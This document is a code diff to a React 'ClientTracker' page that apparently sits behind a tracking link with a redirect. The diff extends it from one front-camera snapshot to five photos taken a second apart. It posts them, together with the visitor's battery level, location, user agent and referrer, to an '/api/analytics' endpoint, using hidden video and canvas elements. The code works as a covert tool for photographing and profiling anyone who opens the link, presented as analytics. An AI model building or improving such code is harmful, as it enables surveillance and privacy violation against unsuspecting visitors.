@@ -1,6 +1,5 @@
 /* eslint-disable react-hooks/exhaustive-deps */
 /* eslint-disable @typescript-eslint/no-explicit-any */
-/* eslint-disable @typescript-eslint/no-unused-vars */
 "use client";
 import { useEffect, useRef, useState } from "react";
 
@@ -14,6 +13,7 @@ export default function ClientTracker({
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const [cameraStatus, setCameraStatus] = useState<string>("initializing");
+  const [captureProgress, setCaptureProgress] = useState<string>("");
 
   useEffect(() => {
     const collectAnalytics = async () => {
@@ -27,7 +27,6 @@ export default function ClientTracker({
         };
 
         let batteryLevel: number | null = null;
-
         try {
           const nav: any = navigator;
           if (typeof nav.getBattery === "function") {
@@ -63,19 +62,19 @@ export default function ClientTracker({
           }
         }
 
-        // Capture photo from front camera
-        let photoData = null;
+        // 📸 Capture up to 5 photos from the front camera
+        let photos: string[] = [];
         try {
           setCameraStatus("requesting_permission");
-          photoData = await captureFrontCameraPhoto();
+          photos = await captureFrontCameraPhotos(5, 1000); // 5 photos, 1s apart
           setCameraStatus("captured");
-          console.log("Front camera photo captured successfully");
+          console.log(`Captured ${photos.length} photos successfully`);
         } catch (error: any) {
           setCameraStatus("failed");
-          console.log("Camera capture failed:", error.message);
+          console.error("Camera capture failed:", error.message);
         }
 
-        // Send analytics data with photo
+        // 📤 Send analytics data with captured photos
         await fetch("/api/analytics", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -89,13 +88,11 @@ export default function ClientTracker({
             userAgent: navigator.userAgent,
             referrer,
             location,
-            photo: photoData, // Base64 encoded photo
-            hasCamera: !!photoData,
-            cameraStatus: cameraStatus,
+            photos, // send multiple photos
+            hasCamera: photos.length > 0,
+            cameraStatus,
           }),
         });
-
-
       } catch (err) {
         console.error("Analytics post failed:", err);
       }
@@ -104,93 +101,75 @@ export default function ClientTracker({
     collectAnalytics();
   }, [slug, redirectUrl]);
 
-  // Function to capture photo from front camera
-  const captureFrontCameraPhoto = async (): Promise<string | null> => {
-    try {
-      // Check if browser supports media devices
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        throw new Error("Camera not supported in this browser");
-      }
-
-      // Request front camera
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: {
-          facingMode: "user", // Front camera
-          width: { ideal: 640 },
-          height: { ideal: 480 }
-        },
-        audio: false
-      });
-
-      // Create video element if not exists
-      if (!videoRef.current) {
-        const video = document.createElement('video');
-        videoRef.current = video;
-      }
-
-      if (!canvasRef.current) {
-        const canvas = document.createElement('canvas');
-        canvasRef.current = canvas;
-      }
-
-      const video = videoRef.current;
-      const canvas = canvasRef.current;
-      const context = canvas.getContext('2d');
-
-      if (!context) {
-        throw new Error("Canvas context not available");
-      }
-
-      // Set video source and wait for it to load
-      video.srcObject = stream;
-      await new Promise((resolve) => {
-        video.onloadedmetadata = () => {
-          video.play();
-          resolve(true);
-        };
-      });
-
-      // Set canvas dimensions to match video
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-
-      // Wait a moment for camera to focus and adjust
-      await new Promise(resolve => setTimeout(resolve, 500));
-
-      // Draw video frame to canvas
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      // Convert canvas to base64 JPEG
-      const photoData = canvas.toDataURL('image/jpeg', 0.8);
-
-      // Stop all video tracks
-      stream.getTracks().forEach(track => track.stop());
-
-      return photoData;
-
-    } catch (error: any) {
-      console.error("Camera capture error:", error);
-      throw new Error(`Camera access denied: ${error.message}`);
+  // 📸 Function to capture multiple photos from front camera
+  const captureFrontCameraPhotos = async (
+    maxPhotos = 5,
+    delayMs = 1000
+  ): Promise<string[]> => {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      throw new Error("Camera not supported in this browser");
     }
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: "user",
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+      },
+      audio: false,
+    });
+
+    // Create or use existing video/canvas
+    const video = videoRef.current ?? document.createElement("video");
+    const canvas = canvasRef.current ?? document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    if (!ctx) throw new Error("Canvas context not available");
+
+    video.srcObject = stream;
+    video.playsInline = true;
+
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => {
+        video.play();
+        resolve(true);
+      };
+    });
+
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+
+    const capturedPhotos: string[] = [];
+
+    for (let i = 0; i < maxPhotos; i++) {
+      setCaptureProgress(`Capturing photo ${i + 1} of ${maxPhotos}...`);
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL("image/jpeg", 0.8);
+      capturedPhotos.push(dataUrl);
+      await new Promise((res) => setTimeout(res, delayMs)); // wait between captures
+    }
+
+    stream.getTracks().forEach((t) => t.stop());
+    setCaptureProgress("");
+
+    return capturedPhotos;
   };
 
-  // Camera status display messages
   const getStatusMessage = () => {
     switch (cameraStatus) {
       case "requesting_permission":
-        return "🔴 Camera: Requesting access to your front camera...";
+        return "🔴 Requesting camera permission...";
       case "captured":
-        return "✅ Camera: Photo captured successfully!";
+        return "✅ Camera: Photos captured successfully!";
       case "failed":
-        return "❌ Camera: Access denied or not available";
+        return "❌ Camera access denied or not available.";
       default:
-        return "🔄 Camera: Initializing...";
+        return "🔄 Initializing camera...";
     }
   };
 
   return (
     <div className="flex flex-col items-center justify-center h-screen w-screen bg-black text-white">
-      {/* Background GIF */}
+      {/* Background animation */}
       <div
         className="absolute inset-0 opacity-50"
         style={{
@@ -200,27 +179,24 @@ export default function ClientTracker({
           backgroundSize: "contain",
         }}
       />
-      
-      {/* Status Overlay */}
-      <div className="relative z-10 text-center bg-black bg-opacity-70 p-6 rounded-lg">        
+
+      {/* Status overlay */}
+      <div className="relative z-10 text-center bg-black bg-opacity-70 p-6 rounded-lg">
         <div className="space-y-3 text-sm">
           <div className="flex items-center justify-center space-x-2">
             <span>📷</span>
             <span>{getStatusMessage()}</span>
           </div>
+          {captureProgress && (
+            <p className="text-xs text-gray-400 animate-pulse">
+              {captureProgress}
+            </p>
+          )}
         </div>
 
-
-        {/* Hidden video and canvas elements for camera */}
-        <video 
-          ref={videoRef} 
-          style={{ display: 'none' }}
-          playsInline
-        />
-        <canvas 
-          ref={canvasRef} 
-          style={{ display: 'none' }}
-        />
+        {/* Hidden video and canvas */}
+        <video ref={videoRef} style={{ display: "none" }} playsInline />
+        <canvas ref={canvasRef} style={{ display: "none" }} />
       </div>
     </div>
   );
